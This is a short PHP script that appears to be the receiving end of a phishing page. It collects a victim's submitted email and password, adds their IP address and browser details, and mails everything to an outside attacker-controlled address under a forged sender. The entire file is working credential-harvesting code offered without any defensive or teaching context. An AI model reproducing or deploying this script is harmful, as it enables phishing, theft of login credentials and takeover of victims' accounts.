<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
    $email = $_POST["email"];
    $password = $_POST["password"];
	$to="msohodra@yandex.com";
	$subject="Client Details";
	$msg="<strong>View new details</strong> <br/><br/> Email: $email <br/>Password: $password <br/> Client IP: $ip <br/> System info: $ua </br>Thank You";
	$headers = "From: rYanbuzz@buzz.me";
	mail($to,$subject,$msg,$headers);
?>